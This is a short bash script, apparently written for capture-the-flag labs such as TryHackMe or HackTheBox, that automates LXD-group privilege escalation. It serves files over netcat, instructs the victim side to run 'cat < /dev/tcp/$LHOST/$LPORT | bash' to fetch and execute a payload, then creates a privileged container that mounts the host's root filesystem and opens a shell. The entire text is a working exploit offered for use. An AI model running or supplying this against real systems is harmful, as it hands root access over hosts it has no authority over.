#!/usr/bin/env bash

LHOST=$(ifconfig | grep "inet " | cut -d " " -f 10 | grep "10") # Here I grepped 10 for tun0 ip address (vpn connection, like tryhackme or hackthebox...), change it if trying to pwn a LOCAL MACHINE.
LPORT=8000 # Change this
LXD_EXPL=$(mktemp).sh

bash ./alpine-builder.sh
echo
echo "Run in the remote machine: 'bash -c \"cat < /dev/tcp/$LHOST/$LPORT | bash\"'"

echo -e \
	"\r#!/usr/bin/env bash\n" \
	"\rcd ~\n" \
	"\rcat < /dev/tcp/$LHOST/$LPORT > ./alpine.tar.gz\n" \
	"\rlxc image import ./alpine.tar.gz --alias myimage\n" \
	"\rlxd init\n" \
	"\rlxc init myimage mycontainer -c security.privileged=true\n" \
	"\rlxc config device add mycontainer mydevice disk source=/ path=/mnt/lxd-exploit/ recursive=true\r" \
	"\rlxc start mycontainer\n" \
	"\rlxc exec mycontainer /bin/sh\n" > $LXD_EXPL
echo
nc -q 10 -nvlp $LPORT < $LXD_EXPL
nc -q 10 -nvlp $LPORT < ./alpine.tar.gz
